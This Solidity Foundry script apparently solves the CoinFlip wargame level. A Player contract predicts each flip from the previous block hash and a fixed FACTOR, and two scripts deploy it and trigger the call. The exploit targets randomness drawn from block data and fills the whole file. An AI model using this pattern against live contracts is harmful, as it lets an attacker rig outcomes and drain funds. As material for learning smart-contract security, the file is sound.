pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";


contract Player
{
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipCoin() external
    {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(/* instance address */).flip(side);
    }
}

contract deploy is Script
{
     function run() external
    {
        vm.startBroadcast();

        Player player = new Player();

        vm.stopBroadcast();
    }
}


contract flip is Script
{
    address player; // address of the deployed Player contract

    function run() external
    {
        vm.startBroadcast();

        Player(player).flipCoin();

        vm.stopBroadcast();
    }
}